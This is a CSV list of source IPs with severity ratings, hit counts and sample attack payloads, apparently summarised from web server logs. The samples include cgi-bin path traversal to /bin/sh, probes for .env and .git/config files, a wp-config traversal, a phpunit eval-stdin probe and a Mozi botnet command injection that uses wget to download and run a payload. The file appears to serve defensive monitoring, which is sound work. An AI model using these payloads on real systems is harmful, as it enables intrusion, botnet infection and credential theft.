IP,SEVERITY,COUNT,SAMPLE_PAYLOAD
185.177.72.30,CRITICAL,849,"GET /admin/phpinfo.php HTTP/1.1"
204.76.203.125,CRITICAL,45,"GET /.env HTTP/1.1"
213.209.159.151,CRITICAL,44,"GET /new/.env HTTP/1.1"
134.65.30.157,CRITICAL,41,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
164.92.129.69,CRITICAL,41,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
31.206.48.120,CRITICAL,41,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
37.120.213.13,CRITICAL,41,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
45.61.134.40,CRITICAL,41,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
86.106.143.180,CRITICAL,17,"POST /wp-admin/admin-ajax.php?template=../../../../../../../wp-config&value=a&min_symbols=1 HTTP/1.1"
162.240.233.90,CRITICAL,12,"GET /bitrix/redirect.php?event1&event2&event3=download&goto=https://interact.sh HTTP/1.1"
192.159.99.95,CRITICAL,6,"POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1"
103.120.63.69,CRITICAL,1,"sh+/tmp/gpon80&ipv=0"
103.175.29.249,CRITICAL,1,"27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink."
117.254.100.80,CRITICAL,1,";sh+/tmp/gpon80&ipv=0"
124.131.119.83,CRITICAL,1,"27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink."
137.59.230.240,CRITICAL,1,";sh+/tmp/gpon80&ipv=0"
139.135.43.149,CRITICAL,1,";sh+/tmp/gpon80&ipv=0"
182.126.124.236,CRITICAL,1,"27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink."
182.127.64.105,CRITICAL,1,"27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink."
213.219.38.113,CRITICAL,1,"GET /inicio.shtml HTTP/1.1"
42.233.107.224,CRITICAL,1,"27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink."
103.203.72.214,CRITICAL,1,";sh+/tmp/gpon80&ipv=0"
117.209.31.78,CRITICAL,1,"27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink."
46.163.189.194,CRITICAL,1,";sh+/tmp/gpon80&ipv=0"
59.103.104.105,CRITICAL,1,";sh+/tmp/gpon80&ipv=0"
103.160.196.167,CRITICAL,1,"27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink."
185.196.10.225,HIGH,215,"\x16\x03\x01\x05\xC2\x01\x00\x05\xBE\x03\x03hz\xB7e\x1C\x98iT\xE6K\xA7\xD1\xD1\xE2\xD0\xDDa\x8Ci\xE3"
49.248.192.204,HIGH,59,"GET /api/.git/config HTTP/1.1"
82.165.66.87,HIGH,28,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
68.183.209.194,HIGH,25,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
78.153.140.224,HIGH,25,"GET /.env HTTP/1.1"
204.76.203.210,HIGH,23,"GET /.env HTTP/1.1"
40.113.19.56,HIGH,22,"GET /wp-admin/images/commentv.php HTTP/1.1"
173.249.15.69,HIGH,20,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
78.153.140.179,HIGH,20,"GET /.env HTTP/1.1"
185.177.72.64,HIGH,12,"GET /.env.development HTTP/1.1"
89.185.81.112,HIGH,11,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
159.65.119.52,HIGH,9,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
45.92.219.150,HIGH,9,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
45.139.104.140,HIGH,8,"GET /.env HTTP/1.1"
130.12.180.34,HIGH,8,"GET /.env HTTP/1.1"
185.177.72.56,HIGH,8,"GET /.env HTTP/1.1"
78.153.140.149,HIGH,8,"GET /.env HTTP/1.1"
139.64.167.210,HIGH,7,"GET /.env HTTP/1.1"
176.65.149.17,HIGH,7,"GET /.env.development HTTP/1.1"
34.158.168.101,HIGH,7,"GET /.env HTTP/1.1"
102.244.97.183,HIGH,6,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
128.199.103.139,HIGH,6,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
128.241.229.30,HIGH,6,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
35.216.189.16,HIGH,6,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03I*\xFFr\xC7+><\xBE\xC9\x83\xC6&\xE2%\x05\xC6\x8Ca\x05\x1"
47.85.49.48,HIGH,6,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
81.163.30.15,HIGH,6,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
104.234.32.26,HIGH,6,"GET /.env.development%20 HTTP/1.1"
173.239.240.77,HIGH,6,"GET /.env.development%20 HTTP/1.1"
213.199.46.10,HIGH,6,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
217.77.8.180,HIGH,6,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
84.200.154.218,HIGH,6,"GET /.env HTTP/1.1"
45.119.212.42,HIGH,6,"GET /public/.env HTTP/1.1"
157.245.53.22,HIGH,5,"GET /.env HTTP/1.1"
45.154.98.220,HIGH,5,"GET /.env HTTP/1.1"
62.171.164.240,HIGH,5,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
104.234.32.28,HIGH,5,"POST /.env HTTP/1.1"
173.239.240.65,HIGH,5,"GET /.env.old HTTP/1.1"
173.239.240.84,HIGH,5,"GET /application/.env HTTP/1.1"
86.48.30.152,HIGH,5,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
103.40.61.98,HIGH,4,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
104.236.9.62,HIGH,4,"GET /.env HTTP/1.1"
185.195.233.176,HIGH,4,"GET /.git/config HTTP/1.1"
193.5.44.36,HIGH,4,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
80.82.77.202,HIGH,4,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xDA\xCB M\xC4Q\x97\x86\x1B\x06\xBE\x84)M\xAF\x11\xD4K\x"
89.117.61.19,HIGH,4,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
103.103.21.109,HIGH,4,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
103.148.195.198,HIGH,4,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
104.234.32.33,HIGH,4,"GET /application/.env HTTP/1.1"
173.212.216.158,HIGH,4,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
173.239.240.63,HIGH,4,"GET /index.php?p=admin/dashboard HTTP/1.1"
173.239.240.69,HIGH,4,"GET /shared/.env%20 HTTP/1.1"
173.239.240.71,HIGH,4,"GET /rest/.env HTTP/1.1"
45.78.235.69,HIGH,4,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
66.116.205.19,HIGH,4,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
66.248.205.66,HIGH,4,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
67.213.118.179,HIGH,4,"GET /.env HTTP/1.1"
77.83.39.218,HIGH,4,"GET /.git/config HTTP/1.1"
94.26.88.31,HIGH,4,"GET /.env HTTP/1.1"
185.177.72.68,HIGH,4,"GET /.env.sample HTTP/1.1"
218.33.108.122,HIGH,4,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
102.244.97.186,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
115.190.29.141,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
123.233.245.135,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
13.79.87.25,HIGH,3,"GET /admins.php HTTP/1.1"
164.92.106.138,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
172.105.128.13,HIGH,3,"\x16\x03\x01\x01"
176.113.115.74,HIGH,3,"\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\x18\x83s\xC9L\xE6\x18\xF6\xA1\x04\xAF\xE3\xFB X\xED\xA6"
190.242.189.254,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
192.210.140.39,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
195.40.154.8,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
199.45.154.127,HIGH,3,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xC9&\xE4z=y\x9B\xDACtG\xF8B\xB2\x97\xB1\xE4\xA3\x04\x88"
217.154.69.208,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
23.94.26.208,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
24.65.233.27,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
37.202.236.248,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
45.135.193.11,HIGH,3,"\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03\xA5i\xCC@=w\x17}\xC9^\xFB/\xAD\xC7N\xD2\xBC*N\xF9.\x96\"
45.192.110.181,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
45.33.80.243,HIGH,3,"\x16\x03\x01\x01"
45.78.235.68,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
59.7.246.67,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
85.11.183.6,HIGH,3,"\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\x8A\xF27\x88\x84\xF1K\xA7\x17|\xEA\xD1;\xC5\x95_\x7F\xC"
107.173.241.217,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
123.58.220.64,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
130.61.28.82,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
141.8.199.216,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
144.31.249.53,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
152.32.205.238,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
152.42.206.46,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
157.173.199.44,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
158.179.190.201,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
160.191.243.61,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
165.154.227.13,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
171.241.40.45,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
173.239.240.74,HIGH,3,"GET /.env HTTP/1.1"
173.239.240.76,HIGH,3,"GET /cp/.env HTTP/1.1"
173.239.240.79,HIGH,3,"GET /docker/.env HTTP/1.1"
175.200.104.40,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
177.70.2.220,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
181.176.14.90,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
185.118.143.154,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
185.128.139.52,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
185.141.107.177,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
190.124.153.17,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
192.250.228.42,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
198.46.146.200,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
206.183.129.205,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
207.244.238.54,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
212.64.216.215,HIGH,3,"GET /.env HTTP/1.1"
23.95.62.123,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
34.60.107.64,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
43.134.78.153,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
43.225.189.143,HIGH,3,"GET /.env HTTP/1.1"
45.78.235.71,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
45.85.146.175,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
47.113.149.86,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
47.253.183.81,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
47.90.209.221,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
49.233.13.171,HIGH,3,"GET /.git/config HTTP/1.1"
5.182.46.67,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
5.223.59.192,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
80.71.149.102,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
85.198.82.246,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
94.183.172.143,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
94.183.172.149,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
114.220.75.156,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
45.151.62.32,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
78.110.121.87,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
78.153.140.151,HIGH,3,"GET /.env HTTP/1.1"
78.153.140.156,HIGH,3,"GET /.env HTTP/1.1"
101.198.0.152,HIGH,2,"\x16\x03\x01\x015\x01\x00\x011\x03\x03&\x97d\xDA\xD5ghGq\xB5>\xB9|\xC9\xAC\xD2\xAC\xF2\x91\x11\x1C>\"
104.248.133.132,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x031&\xB83\xF6b\x03T&\x02\xA3d\xE0\xDC\xAE~\x91\xF2J\x7F\xC2\xBB\"
139.59.230.234,HIGH,2,"GET /.env HTTP/1.1"
142.93.105.7,HIGH,2,"GET /.env HTTP/1.1"
142.93.146.232,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xCD\xDC\xDD\x9E\xCD\xD3<\xF8\xC9\xBF}\xB0\xE3l!\x90S\x8BP\xCF"
142.93.93.42,HIGH,2,"GET /.env HTTP/1.1"
143.244.177.0,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x97\xBE"
146.190.154.118,HIGH,2,"GET /.env HTTP/1.1"
147.185.132.100,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03G\xEE\xED\x84}\x8E\xA2\x95\x1D1\x85\xB2\xE0\xDE\xB3$w"
147.185.132.225,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03x\xBE\x97\xAA\xF0\xB2Hm\x00\x07s>\xFF\xDAe\x145\xF7~b\xE"
147.185.132.231,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xA1\x9C^US\x1E\xD0#\xA7$0\xBA\x08\x84N\xD0\x00\x82T\xF2"
157.245.146.39,HIGH,2,"GET /.env HTTP/1.1"
158.94.211.104,HIGH,2,"\x16\x03\x01\x05\xC6\x01\x00\x05\xC2\x03\x03\xA9\x15 4\x1E\xC8\x7F>\xB4gcK\x80`\x0Cy\x1DPV\xE8\x02\x"
159.203.15.132,HIGH,2,"GET /.env HTTP/1.1"
159.203.37.2,HIGH,2,"GET /.env HTTP/1.1"
159.203.6.127,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xD6\xDE\xD9\xF6\x8FK\x7F\xA4t\x00\xD1c\xB9\xD4/\x91\xD2w\x9EE"
159.203.95.90,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xCC0\xF5\xD8\x99\xDD,\xE3\x97\x81\xF1\xD5\x18\x18w+*3C \xDCa\"
159.89.197.107,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xF97\x22\x96\x1E}\x94\x90O.\x98\x81\xE9\xBF?\x15\xDFCC\xCB\xA"
162.142.125.120,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03W\x82\xE7\x89\x18\xA8t\xF9\x06[\x9C\xA7\xE7\x85\xA2Z\xF6"
162.142.125.216,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03PKl\x8F!\xF5\x198\xF5My\xB8 \x80`vV\xE3\xFE\xAB\xC2\x02\"
162.142.125.47,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x83\xCC\x82\x1F\xBA\xDE\x05 p\x1Al\xD8W\x049\xEC\x93@\x"
164.92.228.51,HIGH,2,"\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03\xF7\x7F\xF4\xAE\x9A\xCFa*V\xB0\xDA\xBEm\x88\xA2\x9B\x97"
167.172.177.68,HIGH,2,"\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03F\xE7*%g\x93'j\x95\x1A\xF9\xB7\xC9{\xD9\xAE7\xB0k\xCD\x8"
167.172.182.95,HIGH,2,"GET /.env HTTP/1.1"
167.71.235.128,HIGH,2,"GET /.env HTTP/1.1"
